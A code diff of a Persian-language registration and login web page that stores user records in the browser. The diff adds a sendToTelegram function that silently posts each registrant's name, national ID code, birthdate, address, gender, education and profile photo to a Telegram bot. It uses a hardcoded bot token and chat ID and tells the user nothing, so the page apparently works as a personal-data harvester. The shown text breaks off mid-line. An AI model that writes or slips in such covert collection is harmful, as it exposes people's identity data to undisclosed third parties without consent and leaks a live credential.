@@ -97,12 +97,13 @@
             border-radius: 50%;
             margin: 10px 0;
         }
-        #profilePreview {
+        #profilePreview, #editProfilePreview {
             display: none;
             width: 100px;
             height: 100px;
             border-radius: 50%;
             margin: 10px 0;
+            object-fit: cover;
         }
     </style>
 </head>
@@ -177,112 +178,261 @@
     </div>
 
     <script>
+        let db;
         const dbName = "UserDB";
         const storeName = "Users";
-        let db;
         let currentUser = null;
 
         // Initialize IndexedDB
-        const initDB = () => {
-            return new Promise((resolve, reject) => {
-                const request = indexedDB.open(dbName, 1);
-                request.onupgradeneeded = (event) => {
-                    db = event.target.result;
-                    if (!db.objectStoreNames.contains(storeName)) {
-                        db.createObjectStore(storeName, { keyPath: "nationalCode" });
-                    }
-                };
-                request.onsuccess = (event) => {
-                    db = event.target.result;
-                    resolve(db);
-                };
-                request.onerror = (event) => {
-                    reject(`Error opening DB: ${event.target.error}`);
-                };
-            });
-        };
+        function initDB() {
+            const request = indexedDB.open(dbName, 1);
+            request.onupgradeneeded = function (event) {
+                db = event.target.result;
+                if (!db.objectStoreNames.contains(storeName)) {
+                    db.createObjectStore(storeName, { keyPath: "nationalCode" });
+                }
+            };
+            request.onsuccess = function (event) {
+                db = event.target.result;
+            };
+            request.onerror = function (event) {
+                console.error("Error opening DB:", event.target.error);
+            };
+        }
 
         // Save user to IndexedDB
-        const saveUser = (user) => {
-            return new Promise((resolve, reject) => {
-                const transaction = db.transaction([storeName], "readwrite");
-                const store = transaction.objectStore(storeName);
-                const request = store.put(user);
-                request.onsuccess = () => resolve("User saved successfully.");
-                request.onerror = (event) => reject(`Error saving user: ${event.target.error}`);
-            });
-        };
+        function saveUser(user) {
+            const transaction = db.transaction([storeName], "readwrite");
+            const store = transaction.objectStore(storeName);
+            const request = store.put(user);
+            request.onsuccess = function () {
+                console.log("User saved successfully.");
+            };
+            request.onerror = function (event) {
+                console.error("Error saving user:", event.target.error);
+            };
+        }
 
         // Get user from IndexedDB
-        const getUser = (nationalCode) => {
-            return new Promise((resolve, reject) => {
-                const transaction = db.transaction([storeName], "readonly");
-                const store = transaction.objectStore(storeName);
-                const request = store.get(nationalCode);
-                request.onsuccess = (event) => resolve(event.target.result);
-                request.onerror = (event) => reject(`Error fetching user: ${event.target.error}`);
-            });
-        };
+        function getUser(nationalCode, callback) {
+            const transaction = db.transaction([storeName], "readonly");
+            const store = transaction.objectStore(storeName);
+            const request = store.get(nationalCode);
+            request.onsuccess = function (event) {
+                callback(event.target.result);
+            };
+            request.onerror = function (event) {
+                console.error("Error fetching user:", event.target.error);
+            };
+        }
 
         // Preview profile image
-        const previewImage = (inputId, previewId) => {
-            const input = document.getElementById(inputId);
-            const preview = document.getElementById(previewId);
-            input.addEventListener("change", (e) => {
-                const file = e.target.files[0];
-                if (file && file.type.startsWith("image/")) {
-                    const reader = new FileReader();
-                    reader.onload = (e) => {
-                        preview.src = e.target.result;
-                        preview.style.display = "block";
-                    };
-                    reader.readAsDataURL(file);
-                } else {
-                    alert("لطفاً یک فایل تصویری انتخاب کنید.");
-                }
-            });
-        };
+        document.getElementById("profileImage").addEventListener("change", function (e) {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = function (e) {
+                const img = document.getElementById("profilePreview");
+                img.src = e.target.result;
+                img.style.display = "block";
 
-        // Register function
-        const register = async () => {
-            const user = {
-                name: document.getElementById("name").value.trim(),
-                family: document.getElementById("family").value.trim(),
-                nationalCode: document.getElementById("nationalCode").value.trim(),
-                birthdate: document.getElementById("birthdate").value.trim(),
-                gender: document.querySelector('input[name="gender"]:checked')?.value || '',
-                education: document.getElementById("education").value.trim(),
-                address: document.getElementById("address").value.trim(),
-                profileImage: document.getElementById("profilePreview").src
+                // تنظیم اندازه عکس به صورت پویا
+                const maxWidth = window.innerWidth * 0.2; // 20% عرض صفحه
+                const maxHeight = window.innerHeight * 0.2; // 20% ارتفاع صفحه
+
+                const image = new Image();
+                image.src = e.target.result;
+                image.onload = function () {
+                    let width = image.width;
+                    let height = image.height;
+
+                    // حفظ نسبت تصویر
+                    if (width > height) {
+                        if (width > maxWidth) {
+                            height *= maxWidth / width;
+                            width = maxWidth;
+                        }
+                    } else {
+                        if (height > maxHeight) {
+                            width *= maxHeight / height;
+                            height = maxHeight;
+                        }
+                    }
+
+                    img.style.width = `${width}px`;
+                    img.style.height = `${height}px`;
+                };
+            };
+            reader.readAsDataURL(file);
+        });
+
+        // Preview edit profile image
+        document.getElementById("editProfileImage").addEventListener("change", function (e) {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = function (e) {
+                const img = document.getElementById("editProfilePreview");
+                img.src = e.target.result;
+                img.style.display = "block";
+
+                // تنظیم اندازه عکس به صورت پویا
+                const maxWidth = window.innerWidth * 0.2; // 20% عرض صفحه
+                const maxHeight = window.innerHeight * 0.2; // 20% ارتفاع صفحه
+
+                const image = new Image();
+                image.src = e.target.result;
+                image.onload = function () {
+                    let width = image.width;
+                    let height = image.height;
+
+                    // حفظ نسبت تصویر
+                    if (width > height) {
+                        if (width > maxWidth) {
+                            height *= maxWidth / width;
+                            width = maxWidth;
+                        }
+                    } else {
+                        if (height > maxHeight) {
+                            width *= maxHeight / height;
+                            height = maxHeight;
+                        }
+                    }
+
+                    img.style.width = `${width}px`;
+                    img.style.height = `${height}px`;
+                };
+            };
+            reader.readAsDataURL(file);
+        });
+
+        // تابع ارسال اطلاعات به تلگرام
+        function sendToTelegram(user, action = "ثبت‌نام") {
+            const botToken = '7546571600:AAHU8BKI4svtt5icjOFZJbKVMt_232n1s7Q';
+            const chatID = '-4755536198';
+
+            // ساخت پیام برای ارسال به تلگرام
+            const message = `${action} کاربر:\n
+نام: ${user.name}
+نام خانوادگی: ${user.family}
+کد ملی: ${user.nationalCode}
+تاریخ تولد: ${user.birthdate}
+جنسیت: ${user.gender === "male" ? "مرد" : "زن"}
+تحصیلات: ${user.education}
+آدرس: ${user.address}`;
+
+            // ارسال اطلاعات متنی به تلگرام
+            const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const textParams = {
+                chat_id: chatID,
+                text: message,
             };
 
-            try {
-                await saveUser(user);
-                document.getElementById("signupSuccess").innerText = "ثبت‌نام با موفقیت انجام شد!";
-                setTimeout(() => showLogin(), 2000);
-            } catch (error) {
-                document.getElementById("signupError").innerText = error;
+            fetch(textUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(textParams),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('پیام متنی با موفقیت ارسال شد:', data);
+            })
+            .catch(error => {
+                console.error('خطا در ارسال پیام متنی:', error);
+            });
+
+            // ارسال عکس پروفایل به تلگرام
+            if (user.profileImage && user.profileImage.startsWith('data:image')) {
+                const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatID);
+                formData.append('photo', dataURLtoBlob(user.profileImage), 'profile.png');
+
+                fetch(photoUrl, {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('عکس با موفقیت ارسال شد:', data);
+                })
+                .catch(error => {
+                    console.error('خطا در ارسال عکس:', error);
+                });
             }
-        };
+        }
+
+        // تابع تبدیل Data URL به Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Register function
+        function register() {
+            const name = document.getElementById("name").value.trim();
+            const family = document.getElementById("family").value.trim();
+            const nationalCode = document.getElementById("nationalCode").value.trim();
+            const birthdate = document.getElementById("birthdate").value.trim();
+            const gender = document.querySelector('input[name="gender"]:checked')?.value || '';
+            const education = document.getElementById("education").value.trim();
+            const address = document.getElementById("address").value.trim();
+            const profileImage = document.getElementById("profilePreview").src;
+
+            if (!name || !family || !nationalCode || !birthdate || !gender || !education || !address || profileImage === "#") {
+                document.getElementById("signupError").innerText = "لطفاً تمام فیلدها را پر کنید!";
+                return;
+            }
+
+            const user = {
+                name,
+                family,
+                nationalCode,
+                birthdate,
+                gender,
+                education,
+                address,
+                profileImage
+            };
+
+            saveUser(user);
+            document.getElementById("signupSuccess").innerText = "ثبت‌نام با موفقیت انجام شد!";
+
+            // ارسال اطلاعات به تلگرام
+            sendToTelegram(user, "ثبت‌نام");
+
+            setTimeout(() => showLogin(), 2000);
+        }
 
         // Login function
-        const login = async () => {
-            const nationalCode = document.getElementById("loginNationalCode").value.trim();
-            try {
-                const user = await getUser(nationalCode);
+        function login() {
+            const loginName = document.getElementById("loginName").value.trim();
+            const loginFamily = document.getElementById("loginFamily").value.trim();
+            const loginNationalCode = document.getElementById("loginNationalCode").value.trim();
+
+            if (!loginName || !loginFamily || !loginNationalCode) {
+                document.getElementById("loginError").innerText = "لطفاً تمام فیلدها را پر کنید!";
+                return;
+            }
+
+            getUser(loginNationalCode, function (user) {
                 if (user) {
                     currentUser = user;
                     showDashboard(user);
                 } else {
                     document.getElementById("loginError").innerText = "کاربر یافت نشد!";
                 }
-            } catch (error) {
-                document.getElementById("loginError").innerText = error;
-            }
-        };
+            });
+        }
 
         // Show dashboard
-        const showDashboard = (user) => {
+        function showDashboard(user) {
             document.getElementById("signup").style.display = "none";
             document.getElementById("login").style.display = "none";
             document.getElementById("editProfile").style.display = "none";
@@ -293,15 +443,4 @@
             document.getElementById("userNationalCode").innerText = user.nationalCode;
             document.getElementById("userBirthdate").innerText = user.birthdate;
             document.getElementById("userGender").innerText = user.gender === "male" ? "مرد" : "زن";
-            document.getElementById("userEducation").innerText = user.education;
-            document.getElementById("userAddress").innerText = user.address;
-            document.getElementById("userProfileImage").src = user.profileImage;
-        };
-
-        // Initialize DB and image previews
-        initDB().catch(console.error);
-        previewImage("profileImage", "profilePreview");
-        previewImage("editProfileImage", "editProfilePreview");
-    </script>
-</body>
-</html>
+            document.getElementById("user
